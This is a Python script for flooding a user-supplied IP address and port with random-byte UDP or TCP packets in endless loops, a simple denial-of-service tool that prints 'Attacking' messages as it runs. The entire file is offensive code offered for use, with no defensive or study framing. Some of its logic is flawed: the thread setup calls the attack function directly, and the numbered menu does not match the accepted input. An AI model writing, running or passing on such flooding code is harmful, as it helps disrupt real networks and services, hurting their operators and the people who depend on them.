import socket
import random
import threading
import time

print("1.) UDP")
print("2.) TCP")
choose = input("Choose a socket to attack in: ")

def UDP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("Enter in IP: ")
    port = int(input("Port: "))
    thread = int(input("Threads: "))
    speed = float(input("Speed: "))
    s.connect((ip, port))
    
    def attack(ip, port, speed):
        m = random._urandom(10)
        p = 0
        while True:
            try:
                s.send(m * 1000)
                s.send(random._urandom(10) * 20)
                for i in range(1, 100**1000):
                    s.send(random._urandom(20) * 100)
                    s.send(m * 1000)
                    print(f"Attacking: {ip} port: {port} Socket: UDP Packets: {p}")
                    p += 1 + 2
                    time.sleep(speed)
            except socket.error:
                s.close()
                print("Host didn't respond.")
            except KeyboardInterrupt:
                s.close()
                UDP()
            except:
                s.close()
                print("Offline.")
                
    for x in range(thread):
        t = threading.Thread(target=attack(ip, port, speed))
        t.start()
        
def TCP():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = input("Enter in IP: ")
    port = int(input("Port: "))
    thread = int(input("Threads: "))
    speed = float(input("Speed: "))
    s.connect((ip, port))
    
    def attack(ip, port, speed):
        m = random._urandom(10)
        p = 0
        while True:
            try:
                s.send(m * 1000)
                s.send(random._urandom(10) * 20)
                for i in range(1, 100**1000):
                    s.send(random._urandom(20) * 100)
                    s.send(m * 1000)
                    print(f"Attacking: {ip} port: {port} Socket: TCP Packets: {p}")
                    p += 1
                    time.sleep(speed)
            except socket.error:
                s.close()
                print("Host didn't respond.")
            except KeyboardInterrupt:
                s.close()
                TCP()
            except:
                s.close()
                print("Offline.")
                
    for x in range(thread):
        t = threading.Thread(target=attack(ip, port, speed))
        t.start()

if choose == "UDP":
    UDP()
elif choose == "TCP":
    TCP()
else:
    print("Invalid choice. (Uppercase only)")
    time.sleep(5)
    exit()
